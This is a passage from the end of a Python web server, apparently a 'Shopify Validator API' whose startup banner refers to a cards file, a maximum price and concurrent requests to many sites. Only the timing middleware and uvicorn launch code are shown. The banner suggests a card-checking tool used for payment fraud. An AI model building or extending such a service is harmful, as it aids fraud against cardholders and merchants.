    t0   = time.time()
    resp = await call_next(request)
    resp.headers["X-Response-Time"] = f"{(time.time() - t0)*1000:.1f}ms"
    _stats["total_requests"] += 1
    path = request.url.path
    _stats[f"requests_{path.strip('/').replace('/', '_') or 'root'}"] += 1
    return resp


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    print(
        f"\n{'='*60}\n"
        f"  Shopify Validator API  v3.1\n"
        f"  Port:            {PORT}\n"
        f"  Workers:         {WORKERS}\n"
        f"  Pool:            {POOL_SIZE} total / {POOL_PER_HOST} per host\n"
        f"  Site concurrency:{SITE_CONCURRENCY}\n"
        f"  Product cache:   {int(CACHE_TTL)}s TTL\n"
        f"  Max price:       ${MAX_PRICE:.2f}\n"
        f"  Cards file:      {CARDS_FILE}\n"
        f"{'='*60}\n"
    )
    # Determine the uvicorn app target. uvicorn requires an import string
    # like "module:app" when workers>1, so we infer it from this file's
    # actual basename. If the basename is not a valid Python identifier
    # (e.g. "api-who.py" → "api-who"), we fall back to single-worker mode
    # using the in-process `app` object.
    import sys
    module_name = os.path.splitext(os.path.basename(sys.argv[0] or __file__))[0]
    is_valid_module = module_name.isidentifier()

    loop_type = "asyncio"
    try:
        import uvloop
        loop_type = "uvloop"
    except Exception:
        pass

    if is_valid_module and WORKERS > 1:
        uvicorn.run(
            f"{module_name}:app",
            host="0.0.0.0",
            port=PORT,
            workers=WORKERS,
            loop=loop_type,
            http="httptools",
            log_level=LOG_LEVEL.lower(),
            access_log=(LOG_LEVEL == "DEBUG"),
            timeout_keep_alive=30,
            limit_concurrency=5000,
            limit_max_requests=100_000,
            backlog=4096,
        )
    else:
        if WORKERS > 1 and not is_valid_module:
            log.warning(
                "Module name '%s' is not a valid Python identifier "
                "(rename file to e.g. 'api.py' to enable multi-worker mode). "
                "Falling back to single-worker mode.", module_name
            )
        uvicorn.run(
            app,
            host="0.0.0.0",
            port=PORT,
            loop=loop_type,
            http="httptools",
            log_level=LOG_LEVEL.lower(),
            access_log=(LOG_LEVEL == "DEBUG"),
            timeout_keep_alive=30,
            limit_concurrency=5000,
            limit_max_requests=100_000,
            backlog=4096,
        )
